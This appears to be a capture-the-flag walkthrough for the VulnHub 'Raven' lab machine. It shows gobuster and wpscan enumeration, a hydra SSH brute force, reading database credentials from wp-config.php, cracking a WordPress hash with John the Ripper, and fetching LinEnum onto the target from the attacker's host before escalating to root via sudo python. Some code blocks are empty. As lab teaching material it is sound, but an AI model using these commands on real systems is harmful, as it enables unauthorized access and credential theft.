Writeup for the <a href='https://www.vulnhub.com/entry/raven-1,256/' target="_blank">Raven</a> 
machine from VulnHub. A directory busting scan
reveals a wordpress installation from which we can find two usernames. We can easily bruteforce the
SSH credentials for one of these users using hydra to gain a low privilege shell, which we use
to discover a plaintext password for the MySQL database in the wordpress config file. Exploring
the database reveals another password stored as a Wordpress MD5 hash, which we can crack with JtR.
From there, we can use a python installation running as root to gain a root shell.

You can see that that it's an Apache server running off port 80. Feel free to navigate to it in a web browser
and click around for a bit. In the meantime, we should have some other scans going on in the
background.

Let's start with a directory busting scan. I like gobuster, but feel free to use your tool of choice.
Gobuster scan: <code>gobuster -u 10.0.2.5 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code>
</p>

<p>
We discover a wordpress installation. We can run another directory-busting scan on that directory,
and we could probe a bit more with wpscan: <code>wpscan --url http://10.0.2.5/wordpress -e --wp-content-dir wp-content</code>

<p>
We gain two wordpress users. We could try to log into wordpress at <code>10.0.2.5/wordpress/wp-login.php</code>,
or try our luck with SSH. I prepared hydra and tried at SSH first, since it will be more valuable if it ends up working. If it doesn't, we'll go ahead with wordpress. Either way, we need to create a text file with our users to feed into hydra. Since there are only 2 users, doing it manually is fine. I put them into a file called users.txt. Here's the command:
<code><a href='https://explainshell.com/explain?cmd=hydra+-L+users.txt+-P+%2Fusr%2Fshare%2Fwordlists%2Frockyou.txt++-e+nsr+-o+hydra.log+-t8+-f+ssh%3A%2F%2F10.0.2.5' target="_blank">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt  -e nsr -o hydra.log -t8 -f ssh://10.0.2.5</a></code>. If you're using Kali, unzip whichever wordlist you decided to use. I just used rockyou. Hydra uses 16 threads by default, so I reduced it to 8. Too many parallel connections can cause errors or disable the service.
</p>

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-03-04 21:08:31

```
<p>
And with that, we get michael's SSH password and a low privilege shell.
Log in with <code>ssh michael@10.0.2.5</code>. Now we start enumerating again.
Now that we have a shell, let's take a look at the wordpress folder. Specifically, in <code>wp-config.php</code>. On the way there, I stumbled across flag 2, in /var/www/:
<code>flag2{fc3fd58dcdad9ab23faca6e9a36e581c}</code>.
</p>

```
michael@Raven:/var/www/html/wordpress$ cat wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
[...]
```
<p>
We find the credentials to log into the MySQL database. Wordpress requires MySQL or MariaDB to work, so the credentials for either were likely to exist on the machine. Let's try logging in with the password we found.
</p>

```
michael@Raven:/var/www/html/wordpress$ mysql -u root -p wordpress
Enter password: R@v3nSecurity

And it worked. We get a prompt. Let's start poking around.

<p>
Here's our users again, but we've got some password hashes this time. We still don't have steven's account, so let's try cracking his password. These are MD5 Wordpress hashes:
</p>

![](/img/raven1_wp-hash.png)

<p>
We'll be using JtR for this. First, we need to create a password file: <code>echo steven:P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ > steven.txt</code>. 
</p>

```

```

<p>
Cracked in 4 seconds with rockyou. Now we can log into steven's wordpress account...but let's try SSH first. Michael reused his password, so maybe Steven did as well. This whole machine seems to be an exercise in weak credentials anyway.
</p>

```
root@kali:~# ssh steven@192.168.1.18
steven@192.168.1.18's password:

<p>
It worked. Thats another user, so let's start enumerating again. Lets automate it this time with <a href='https://github.com/rebootuser/LinEnum'>LinEnum.sh</a>. On the attacking machine, host the script with <code>python -m SimpleHTTPServer 9999</code>. On the victim machine, grab the file using wget or curl: <code>wget 10.0.2.5:9999/file.txt</code> OR <code>curl -O http://10.0.2.5/file.txt</code>. Here's the important bit:
</p>

```

<p>
Turns out that steven can run python as root without a password. (We could get this same information with <code>sudo -l</code> while logged in as steven.) Since we can run python as root, and python can spawn a shell, we'll use it to spawn a root shell. Some other common programs that can spawn a shell are nmap, nc, vim, and more. Keep an eye out for these running with root permissions for an easy privesc. I'll use the python interpreter to spawn a shell:

And with that, we get a root shell. Navigate to the root directory to grab flag 4 and that's the box.
